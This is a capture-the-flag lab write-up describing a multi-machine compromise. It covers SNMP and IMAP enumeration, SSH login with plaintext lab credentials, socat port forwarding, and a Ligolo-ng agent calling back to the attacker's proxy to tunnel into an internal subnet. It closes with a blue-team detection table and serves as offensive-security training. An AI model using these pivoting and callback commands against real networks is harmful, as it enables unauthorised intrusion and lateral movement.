# CTF Writeup — KGF1 + KGF2 (Multi-Machine + Ligolo Pivoting)

**Dates:** 25–26 May 2026  
**Targets:** KGF1 (10.0.0.x / 192.168.210.x), KGF2 (192.168.210.124)  
**Attacker:** Kali Linux (10.0.0.110)  
**Network:** NAT Network (10.0.0.0/24) + Host-Only (192.168.210.0/24)  
**Goal:** Compromise KGF1, pivot through it to reach and exploit KGF2 using Ligolo

> ⚠️ Isolated lab environment. No real systems targeted.

---

## Network Topology

```
[Kali] 10.0.0.110
    │
    │ NAT Network (10.0.0.0/24)
    ▼
[KGF1] 10.0.0.x (NAT) + 192.168.210.x (Host-Only) ← dual-homed pivot
    │
    │ Host-Only (192.168.210.0/24) — Kali cannot reach directly
    ▼
[KGF2] 192.168.210.124
```

---

## Phase 1 — KGF1 Enumeration

### Step 1 — Configure Kali IP
```bash
# Manually set Kali IP on NAT network
# Set to 10.0.0.110/24 via network manager (manual configuration)
```

### Step 2 — SNMP Enumeration
```bash
onesixtyone 10.0.0.9 public
# Enumerate SNMP community strings on KGF1
# Found: community string "public" — reveals system information
```

### Step 3 — Port Scan
```bash
nmap 10.0.0.9 -sV
# Open ports:
# 21   = FTP
# 22   = SSH
# 80   = Apache2 (HTTP)
# 2222 = SSH (non-standard port)
```

### Step 4 — IMAP Email Enumeration
```bash
# Credentials found during enumeration:
# Username: garuda    Password: eagle^123
# Username: vittal    Password: micheal(1231)
# Username: reena     Password: M46D3*LMn(*)

# Connect via IMAP and read emails
a1 LOGIN garuda eagle^123
a2 SELECT INBOX
a3 FETCH 1 (BODY[])    # read first email
a5 FETCH 2 (BODY[])    # read second email
# Emails contained hints/credentials for further access
```

---

## Phase 2 — KGF1 Exploitation

```bash
# Access KGF1 using discovered credentials via SSH
ssh garuda@10.0.0.9
# or via non-standard port
ssh vittal@10.0.0.9 -p 2222

# Achieved shell on KGF1
root@KGF1:~#
```

---

## Phase 3 — Pivot to KGF2 via Socat

```bash
# From KGF1 — forward KGF2 services to KGF1's IP
# KGF2 IP: 192.168.210.124

root@KGF1:~# socat TCP-LISTEN:12021,fork TCP:192.168.210.124:21 &
[1] 1693
root@KGF1:~# socat TCP-LISTEN:12022,fork TCP:192.168.210.124:22 &
[2] 1696
root@KGF1:~# socat TCP-LISTEN:12080,fork TCP:192.168.210.124:80 &
[3] 1697
root@KGF1:~# socat TCP-LISTEN:12222,fork TCP:192.168.210.124:2222 &
[4] 1700

# Now from Kali: connect to KGF1:12021 → reaches KGF2:21 (FTP)
# Connect to KGF1:12022 → reaches KGF2:22 (SSH)
# Connect to KGF1:12080 → reaches KGF2:80 (HTTP)
```

---

## Phase 4 — Ligolo-ng Advanced Pivoting

**Date:** 26 May 2026  
**Concept:** Ligolo creates a full VPN-like tunnel — ALL tools (nmap, browser, ssh, hydra) work natively against internal networks, not just Metasploit.

### Network Setup
```
Kali:           NAT Network (Bridge) = 192.168.1.x
Windows pivot:  NAT Network (192.168.1.35) + Host-Only (192.168.210.117)
Metasploitable2: Host-Only (192.168.210.118) ← not directly reachable from Kali
```

### Ligolo Setup on Kali (Proxy/Controller)
```bash
# Run Ligolo proxy with self-signed cert
./proxy -selfcert
# Listening on 0.0.0.0:11601

# Add TUN interface (one-time setup)
ip tuntap add user root mode tun ligolo
ip link set ligolo up

# After agent connects — add route for internal network
ip route add 192.168.210.0/24 dev ligolo
```

### Ligolo Agent on Compromised Host (Windows pivot)
```bash
# Transfer agent to Windows pivot, run it
./agent.exe -connect 192.168.1.21:11601 -ignore-cert
# Agent connects back to Kali Ligolo proxy
```

### Using the Tunnel
```bash
# In Ligolo proxy — start the tunnel
session        # select the connected agent
start          # activate tunnel

# Now from Kali — access 192.168.210.0/24 DIRECTLY
nmap 192.168.210.118 -sV       # scan Metasploitable2 through tunnel
ssh msfadmin@192.168.210.118   # SSH directly to internal target
curl http://192.168.210.118    # browse internal web server
```

### Ligolo vs Metasploit Routing

| Feature | Metasploit route | Ligolo-ng |
|---------|-----------------|-----------|
| Tools that work | Metasploit modules only | All tools (nmap, curl, ssh, etc.) |
| Setup | Simple — `route add` in msfconsole | Slightly more setup |
| Speed | Slower | Faster |
| Stability | Good | Excellent |
| Use case | Quick pivot during Metasploit session | Full internal network access |

---

## Full Attack Chain — KGF1 + KGF2

```
1. SNMP enumeration on KGF1 → identifies system info
         ↓
2. Port scan → FTP, SSH, HTTP, SSH-2222 found
         ↓
3. IMAP email enumeration → credentials discovered
         ↓
4. SSH login to KGF1 → root shell
         ↓
5. Socat port forwarding → KGF2 services exposed via KGF1
         ↓
6. Ligolo tunnel → full native access to 192.168.210.0/24 network
         ↓
7. KGF2 exploited through tunnel
```

---

## Key Takeaways

1. **SNMP is underestimated** — community string "public" reveals system details without authentication
2. **Email servers hold credentials** — IMAP enumeration is a fast path to user accounts
3. **Socat is pre-installed on most Linux systems** — no additional tools needed for basic pivoting
4. **Ligolo-ng is the modern standard** for professional penetration testing pivoting
5. **Dual-homed hosts** (two network adapters) are the pivot point in segmented networks — always check `ip a` on compromised hosts
6. **Tool-agnostic pivoting** (Ligolo) is more powerful than Metasploit routing — it lets you use any tool you already know

---

## Blue Team — Detection & Prevention

| Attack | Detection | Prevention |
|--------|-----------|------------|
| SNMP enumeration | Monitor SNMP queries from unknown IPs | Restrict SNMP to management IPs, use SNMPv3 |
| IMAP credential exposure | Audit email contents, monitor logins | Encrypt sensitive comms, enforce MFA |
| Socat port forwarding | Unusual listening ports on servers | Host-based IDS, restrict which binaries can listen |
| Ligolo tunnel | Unexpected TLS outbound connections | Egress filtering, DLP, network monitoring |
| Pivot to internal segment | Unusual traffic between segments | Zero trust, microsegmentation, IDS on internal links |
